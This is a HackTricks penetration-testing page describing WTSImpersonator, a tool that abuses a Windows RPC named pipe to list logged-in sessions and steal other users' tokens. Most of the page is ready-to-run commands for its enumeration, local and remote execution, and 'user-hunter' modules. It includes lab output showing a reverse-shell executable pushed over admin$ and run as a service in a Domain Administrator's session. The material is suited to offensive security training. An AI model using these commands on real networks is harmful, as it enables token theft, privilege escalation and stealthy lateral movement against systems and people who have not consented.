
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

WTS Impersonator abuses the “**\\pipe\LSM_API_service**” RPC Named pipe to enumerate users logged in and steal tokens of other users without using the normal "Token Impersonation technique", this allows nice and easy lateral movement while staying stealth, this technique was researched and developed by [Omri Baso](https://www.linkedin.com/in/omri-baso/).

The `WTSImpersonator` tool can be found on [github](https://github.com/OmriBaso/WTSImpersonator).

```
WTSEnumerateSessionsA → WTSQuerySessionInformationA -> WTSQueryUserToken -> CreateProcessAsUserW
```

#### `enum` Module:  
  
Enumerate Local Users on the machine the tool is running from  
```powershell
.\WTSImpersonator.exe -m enum
```
Enumerate a machine remotely given an IP or an Hostname.
```powershell  
.\WTSImpersonator.exe -m enum -s 192.168.40.131  
```
#### `exec` / `exec-remote` Module:  
Both "exec" and "exec-remote" requires being in a **"Service"** context.  
The local "exec" module does not need anything but the WTSImpersonator.exe and the binary you want to execute \(-c flag\), this could be  
a normal "C:\\Windows\\System32\\cmd.exe" and you will open a CMD as the user you desire, an example would be  
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe  
```
you could use PsExec64.exe in order to obtain a service context  
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

For `exec-remote` things are a bit different, I created a service that can be installed remotely just like `PsExec.exe`  
the service will receive a `SessionId` and a `binary to run` as an argument and it will be installed and executed remotely given the right permissions  
an example run would look as follows:
  
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m enum -s 192.168.40.129

 __          _________ _____ _____                                                 _
 \ \        / /__   __/ ____|_   _|                                               | |
  \ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
   \ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
    \  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
     \/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
                                            | |
                                            |_|
         By: Omri Baso
WTSEnumerateSessions count: 1
[2] SessionId: 2 State: WTSDisconnected (4) WinstationName: ''
        WTSUserName:  Administrator
        WTSDomainName: LABS
        WTSConnectState: 4 (WTSDisconnected)
```  
as can be seen above the `Sessionid` of the Administrator account is `2` so we use it next in the `id` variable when executing code remotely
```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```  
#### `user-hunter` Module:  

The user hunter module will give you the ability to enumerate multiple machines and if a given user is found, it will execute code on this user behalf.  
this is useful when hunting for "Domain Admins" while having local administrator rights on a few machines.  

```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe 
```

Example:

```powershell
PS C:\Users\Jon\Desktop> .\WTSImpersonator.exe -m user-hunter -uh LABS/Administrator -ipl .\test.txt -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe

 __          _________ _____ _____                                                 _
 \ \        / /__   __/ ____|_   _|                                               | |
  \ \  /\  / /   | | | (___   | |  _ __ ___  _ __   ___ _ __ ___  ___  _ __   __ _| |_ ___  _ __
   \ \/  \/ /    | |  \___ \  | | | '_ ` _ \| '_ \ / _ \ '__/ __|/ _ \| '_ \ / _` | __/ _ \| '__|
    \  /\  /     | |  ____) |_| |_| | | | | | |_) |  __/ |  \__ \ (_) | | | | (_| | || (_) | |
     \/  \/      |_| |_____/|_____|_| |_| |_| .__/ \___|_|  |___/\___/|_| |_|\__,_|\__\___/|_|
                                            | |
                                            |_|
         By: Omri Baso

[+] Hunting for: LABS/Administrator On list: .\test.txt
[-] Trying: 192.168.40.131
[+] Opned WTS Handle: 192.168.40.131
[-] Trying: 192.168.40.129
[+] Opned WTS Handle: 192.168.40.129

----------------------------------------
[+] Found User: LABS/Administrator On Server: 192.168.40.129
[+] Getting Code Execution as: LABS/Administrator
[+] Trying to execute remotly
[+] Transfering file remotely from: .\WTSService.exe To: \\192.168.40.129\admin$\voli.exe
[+] Transfering file remotely from: .\SimpleReverseShellExample.exe To: \\192.168.40.129\admin$\DrkSIM.exe
[+] Successfully transfered file!
[+] Successfully transfered file!
[+] Sucessfully Transferred Both Files
[+] Will Create Service voli
[+] Create Service Success : "C:\Windows\voli.exe" 2 C:\Windows\DrkSIM.exe
[+] OpenService Success!
[+] Started Sevice Sucessfully!

[+] Deleted Service
```